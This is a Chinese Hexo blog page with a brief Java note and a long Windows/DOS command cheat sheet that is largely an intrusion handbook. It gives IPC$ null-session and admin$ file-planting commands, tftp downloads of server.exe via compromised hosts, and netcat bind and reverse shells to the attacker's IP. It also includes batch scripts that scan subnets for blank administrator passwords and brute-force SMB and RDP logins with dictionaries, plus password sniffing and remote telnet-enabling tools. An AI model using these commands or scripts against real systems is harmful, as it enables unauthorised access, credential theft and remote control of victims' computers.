<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="abstract-有什么区别" class="article article-type-abstract" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/12/29/有什么区别/" class="article-date">
  <time datetime="2017-12-29T06:38:56.000Z" itemprop="datePublished">2017-12-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/12/29/有什么区别/">abstract class 和interface 有什么区别</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="abstract-class-和interface-有什么区别？"><a href="#abstract-class-和interface-有什么区别？" class="headerlink" title="abstract class 和interface 有什么区别？"></a>abstract class 和interface 有什么区别？</h3><pre><code>1. 抽象类中可以有构造方法,接口中没有构造方法
2. 抽象类中可以有普通成员,接口中没有普通成员
3. 抽象类中可以有普通方法,接口中都是抽象方法
4. 抽象类中可以有修饰符public,protected,接口中只能有public,默认public abstract
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/12/29/有什么区别/" data-id="cjebf17gc003l203tld5544q6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaSE/">JavaSE</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-DOS命令大全" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/12/29/DOS命令大全/" class="article-date">
  <time datetime="2017-12-29T05:34:42.000Z" itemprop="datePublished">2017-12-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/12/29/DOS命令大全/">Windows下DOS命令大全(经典收藏)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>copy:</strong> \ip\admin$\svv.exe c:\ 或:copy\ip\admin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： </p>
<p><strong>xcopy</strong> 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 </p>
<p><strong>tftp -i</strong> 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将”IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>
<p><strong>tftp -i</strong> 对方IP　put c:\server.exe 登陆后，上传本地c:\server.exe至主机<br><strong>ftp ip</strong> 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；<br>默认为ASCII格式传送(文本文件时)<br><strong>route print </strong>显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br><strong>arp</strong> 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br><strong>start </strong>程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令<br><strong>mem </strong>查看cpu使用情况<br><strong>attrib </strong>文件名(目录名) 查看某文件（目录）的属性<br><strong>attrib</strong> 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性<br><strong>dir </strong>查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间<br><strong>date /t 、 time /t </strong>使用此参数即”DATE/T”、”TIME/T”将只显示当前日期和时间，而不必输入新日期和时间<br><strong>set</strong> 指定环境变量名称=要指派给变量的字符 设置环境变量<br>set 显示当前所有的环境变量<br>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量<br>pause 暂停批处理程序，并显示出：请按任意键继续….<br>if 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：”：start”标签）<br>call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）<br>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>echo 信息 在屏幕上显示出信息<br>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中<br>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello<br>find 文件名 查找某文件<br>title 标题名字 更改CMD窗口标题名字<br>color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白<br>prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )<br>net use \ip\ipc$ “ “ /user:” “ 建立IPC空链接<br>net use \ip\ipc$ “密码” /user:”用户名” 建立IPC非空链接<br>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:<br>net use h: \ip\c$ 登陆后映射对方C：到本地为H:<br>net use \ip\ipc$ /del 删除IPC链接<br>net use h: /del 删除映射对方到本地的为H:的映射<br>net user 用户名　密码　/add 建立用户<br>net user guest /active:yes 激活guest用户<br>net user 查看有哪些用户<br>net user 帐户名 查看帐户的属性<br>net localgroup administrators 用户名 /add 把”用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数<br>net start 查看开启了哪些服务<br>net start 服务名　 开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net time \目标ip 查看对方时间<br>net time \目标ip /set 设置本地计算机时间与”目标IP”主机的时间同步,加上参数/yes可取消确认信息<br>net view 查看本地局域网内开启了哪些共享<br>net view \ip 查看对方局域网内开启了哪些共享<br>net config 显示系统网络设置<br>net logoff 断开连接的共享<br>net pause 服务名 暂停某服务<br>net send ip “文本信息” 向对方发信息<br>net ver 局域网内正在使用的网络连接类型和信息<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ /del 删除ipc$共享<br>net share c$ /del 删除C：共享<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -a 查看开启了哪些端口,常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：”-w数字”用于设置超时间隔。<br>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)<br>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数”/all”显示全部配置信息<br>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如”DEL/AR <em>.</em>“表示删除当前目录下所有只读文件，”DEL/A-S <em>.</em>“表示删除当前目录下除系统文件以外的所有文件</p>
<p>#2 二：<br>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖<br>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令<br>at id号 开启已注册的某个计划任务<br>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止<br>at id号 /delete 停止某个已注册的计划任务<br>at 查看所有的计划任务<br>at \ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机<br>finger username @host 查看最近有哪些用户登陆<br>telnet ip 端口 远和登陆服务器,默认端口为23<br>open ip 连接到IP（属telnet登陆后的命令）<br>telnet 在本机上直接键入telnet 将进入本机的telnet<br>copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件<br>copy c:\srv.exe \ip\admin$ 复制本地c:\srv.exe到对方的admin下<br>cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件<br>ver 在DOS窗口下显示版本信息<br>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS<br>md　目录名 创建目录<br>replace 源文件　要替换文件的目录 替换文件<br>ren 原文件名　新文件名 重命名文件名<br>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>type 文件名 显示文本文件的内容<br>more 文件名 逐屏显示输出文件<br>doskey 要锁定的命令＝字符<br>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=<br>taskmgr 调出任务管理器<br>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误<br>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口<br>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe<br>path 路径\可执行文件的文件名 为可执行文件设置一个路径。<br>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；<br>regedit /e 注册表文件名 导出注册表<br>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。<br>cacls 文件名 查看文件的访问用户权限列表<br>REM 文本内容 在批处理文件中添加注解<br>netsh 查看或更改本地网络配置情况</p>
<p>#4 四：<br>IIS服务命令：<br>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>iisreset /start或stop 启动（停止）所有Internet服务<br>iisreset /restart 停止然后重新启动所有Internet服务<br>iisreset /status 显示所有Internet服务状态<br>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动<br>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>FTP 命令： (后面有详细说明内容)<br>ftp的命令行格式为:<br>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>－d 使用调试方式。<br>－n 限制ftp的自动登录,即不使用.netrc文件。<br>－g 取消全局文件名。<br>help [命令] 或 ？[命令] 查看命令说明<br>bye 或 quit 终止主机FTP进程,并退出FTP管理方式.<br>pwd 列出当前远端主机目录<br>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>mget [remote-files] 从远端主机接收一批文件至本地主机<br>mput local-files 将本地主机中一批文件传送至远端主机<br>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件<br>ascii 设定以ASCII方式传送文件(缺省值)<br>bin 或 image 设定以二进制方式传送值)<br>bin 或 image 设定以二进制方式传送文件<br>bell 每完成一次文件传送,报警提示<br>cdup 返回上一级目录<br>close 中断与远程服务器的ftp会话(与open对应)<br>open host[port] 建立指定ftp服务器连接,可指定连接端口<br>delete 删除远端主机中的文件<br>mdelete [remote-files] 删除一批文件<br>mkdir directory-name 在远端主机中建立目录<br>rename [from] [to] 改变远端主机中的文件名<br>rmdir directory-name 删除远端主机中的目录<br>status 显示当前FTP的状态<br>system 显示远端主机系统类型<br>user user-name [password] [account] 重新以别的用户名登录远端主机<br>open host [port] 重新建立一个新的连接<br>prompt 交互提示模式<br>macdef 定义宏命令<br>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录<br>chmod 改变远端主机的文件权限<br>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母<br>cd remote－dir 进入远程主机目录<br>cdup 进入远程主机目录的父目录<br>! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip<br>MYSQL 命令：<br>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。<br>（例：mysql -h110.110.110.110 -Uroot -P123456<br>注:u与root可以不用加空格，其它也一样）<br>exit 退出MYSQL<br>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>grant select on 数据库.<em> to 用户名@登录主机 identified by \”密码\”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>use mysql；<br>show tables; 显示库中的数据表<br>describe 表名; 显示数据表的结构<br>create database 库名; 建库<br>use 库名；<br>create table 表名 (字段设定列表)； 建表<br>drop database 库名;<br>drop table 表名； 删库和删表<br>delete from 表名; 将表中记录清空<br>select </em> from 表名; 显示表中的记录<br>mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的\mysql\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br>win2003系统下新增命令（实用部份）：<br>shutdown /参数 关闭或重启本地或远程主机。<br>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。<br>例：shutdown /r /t 0 立即重启本地主机（无延时）<br>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。<br>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。<br>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。<br>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>
<p>#6 六：<br>Linux系统下基本命令： 要区分大小写<br>uname 显示版本信息（同win2K的 ver）<br>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）<br>附：批处理命令与变量<br>1：for命令及变量 基本格式：<br>FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3<br>(set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；”(1 -1 254)”说明：即从254到1 }<br>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>command_parameters：为特定命令指定参数或命令行开关<br>IN (set)：指在(set)中取值；DO command ：指执行command<br>参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\pass.txt)时 }。<br>用法举例：<br>@echo off<br>echo 用法格式：test.bat <em>.</em>.<em> &gt; test.txt<br>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \%1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt<br>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br>/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：</em>.<em>.</em>为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。<br>@echo off<br>echo 用法格式：ok.bat ip<br>FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200<br>存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>2：if命令及变量 基本格式：<br>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为”真”。<br>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>例：”if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）<br>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>例：”if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。</p>
<p>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。<br>当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：”if exist test.txt. else echo test.txt.missing “，注意命令中的”.”</p>
<p>（二）系统外部命令(均需下载相关工具)：<br>1、瑞士军刀：nc.exe<br>参数说明：<br>-h 查看帮助信息<br>-d 后台模式<br>-e prog程序重定向，一但连接就执行［危险］<br>-i secs延时的间隔<br>-l 监听模式，用于入站连接<br>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C<br>-n IP地址，不能用域名<br>-o film记录16进制的传输<br>-p[空格]端口 本地端口号<br>-r 随机本地及远程端口<br>-t 使用Telnet交互方式<br>-u UDP模式<br>-v 详细输出，用-vv将更详细<br>-w数字 timeout延时间隔<br>-z 将输入，输出关掉（用于扫锚时）<br>基本用法：<br>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口<br>nc -l -p 80 开启本机的TCP 80端口并监听<br>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口<br>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口<br>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口<br>高级用法：<br>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止<br>nc -L -p 80 &gt; c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt<br>nc -L -p 80 &lt; c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用<br>type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用<br>本机上用：nc -l -p 本机端口<br>在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 <em>win2K<br>nc -e /bin/sh 本机IP -p 本机端口 </em>linux,unix 反向连接突破对方主机的防火墙<br>本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称<br>在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机<br>备 注：<br>| 管道命令<br>&lt; 或 &gt; 重定向命令。”&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令<br>＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\winnt &gt;&gt; d:\log.txt 意思是：后台执行dir，并把结果存在d:\log.txt中 </p>
<blockquote>
<p>与&gt;&gt;的区别 　“&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。<br>如：@dir c:\winnt &gt;&gt; d:\log.txt和@dir c:\winnt &gt; d:\log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>
</blockquote>
<p>#8 八：<br>2、扫锚工具：xscan.exe<br>基本格式<br>xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息<br>xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息<br>检测项目<br>-active 检测主机是否存活<br>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>-port 检测常用服务的端口状态<br>-ftp 检测FTP弱口令<br>-pub 检测FTP服务匿名用户写权限<br>-pop3 检测POP3-Server弱口令<br>-smtp 检测SMTP-Server漏洞<br>-sql 检测SQL-Server弱口令<br>-smb 检测NT-Server弱口令<br>-iis 检测IIS编码/解码漏洞<br>-cgi 检测CGI漏洞<br>-nasl 加载Nessus攻击脚本<br>-all 检测以上所有项目<br>其它选项<br>-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取<br>-l 显示所有网络适配器<br>-v 显示详细扫描进度<br>-p 跳过没有响应的主机<br>-o 跳过没有检测到开放端口的主机<br>　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10<br>-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)<br>用法示例<br>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测”hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机<br>3、命令行方式嗅探器: xsniff.exe<br>可捕获局域网内FTP/SMTP/POP3/HTTP协议密码<br>参数说明<br>-tcp 输出TCP数据报<br>-udp 输出UDP数据报<br>-icmp 输出ICMP数据报<br>-pass 过滤密码信息<br>-hide 后台运行<br>-host 解析主机名<br>-addr IP地址 过滤IP地址<br>-port 端口 过滤端口<br>-log 文件名 将输出保存到文件<br>-asc 以ASCII形式输出<br>-hex 以16进制形式输出<br>用法示例<br>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出<br>4、终端服务密码破解: tscrack.exe<br>参数说明<br>-h 显示使用帮助<br>-v 显示版本信息<br>-s 在屏幕上打出解密能力<br>-b 密码错误时发出的声音<br>-t 同是发出多个连接（多线程）<br>-N Prevent System Log entries on targeted server<br>-U 卸载移除tscrack组件<br>-f 使用－f后面的密码<br>-F 间隔时间（频率）<br>-l 使用－l后面的用户名<br>-w 使用－w后面的密码字典<br>-p 使用－p后面的密码<br>-D 登录主页面<br>用法示例<br>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>@if not exist ipcscan.txt goto noscan<br>@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i<br>nscan<br>@echo 3389.txt no find or scan faild<br>(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>@if not exist tscrack.exe goto noscan<br>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>:noscan<br>@echo tscrack.exe no find or scan faild<br>(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)<br>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。<br>5、其它：<br>Shutdown.exe<br>Shutdown \IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）<br>fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）<br>fpipe -l 80 -s 1029 -r 80 <a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a> 当有人扫锚你的80端口时，他扫到的结果会完全是<a href="http://www.sina.com.cn的主机信息" target="_blank" rel="noopener">www.sina.com.cn的主机信息</a><br>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。<br>OpenTelnet.exe (远程开启telnet工具)<br>opentelnet.exe \IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \ip 连接上对方。<br>NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。<br>ResumeTelnet.exe (OpenTelnet附带的另一个工具)<br>resumetelnet.exe \IP　帐号　密码 